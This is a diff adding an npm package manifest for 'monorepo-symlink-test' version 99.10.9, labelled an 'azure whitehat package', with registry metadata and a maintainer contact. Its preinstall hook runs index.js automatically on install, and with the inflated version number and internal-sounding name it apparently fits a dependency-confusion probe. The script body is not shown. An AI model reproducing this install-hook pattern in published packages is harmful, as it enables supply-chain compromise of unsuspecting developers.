@@ -1,0 +1,39 @@
+{
+    "name": "monorepo-symlink-test",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "monorepo-symlink-test@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-juzyYUFS/avlzf6G+cI6xOlQzML2GxYwaqY01RP3n5Ce6bhgolTQhdqm7EvqwSbz5jT2+5nr56jStvEsnW7Jdg==",
+        "shasum": "c56887af9c1d971df74e15ba6cb9453097fd8fdb",
+        "tarball": "https://registry.npmjs.org/monorepo-symlink-test/-/monorepo-symlink-test-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3585,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoRAvCRA9TVsSAnZWagAAnd8P/iBeFDq5fslcMI5rdHft\nHdMRzVfqLhjNgMCsWTX+jOKBO0TjN5sYhyLp4+ykozqriQVP841Y+mPUL+kO\na3sjSN8FxTsYRDpmfYGSPFhpaCtzJvQZzDlko34eqNa4cz9ixf0mLZ4V87Dp\nK/fIFoySj/4t8giqLiDRD42mHWtgMmenDirGkSRFnrmVB7Lnbb7YwjDquNfL\nfsc8gqlSovJdSm63/iv1TJ+qTgIGvOIbQtZGvIPnAtfr39C5Pt0KijqAFRiT\nmuCsX+Hi0UeHT4wBNZqHLsk3AagJFbAQ2T3r1q5U0Nl+jathHXVxE0ag3VGY\nst6YQVNZZ8swoKpcgUXAWrXcNTNyPqFNOOase3KLH0JXglUl1XzjxPwUtoWB\nP1ebl1nncsCnvUd/esC7XpCk6ooXBFJxcc3t+mALkv6Oluw/ZoXS4V2j1ybl\ndV/L8/C1vQtfmWtJJ2u54V3bvfIoM5sP3tMrSVO8EtMx2XHL7HZnM9M0mgeh\nsu4MOvtPST5NHRZRdgerqaKMFqy4KbqM86T0H9VMONH5qd51HlH5JoxOlW6V\n3nkZ2lT0qsmNU3crQe9W7cMeo+Wi6OIovJXCNpgMW3NP0Szi6/EcQfGpbh3K\nsYjLUBypguLyYVX1G2CbzODYt8OtLqAyN5rsprUQub6rXqudknHhRHV2g/qT\npDT7\r\n=7i3Q\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/monorepo-symlink-test_99.10.9_1637945391525_0.7616003653792933"
+    },
+    "_hasShrinkwrap": false
+}
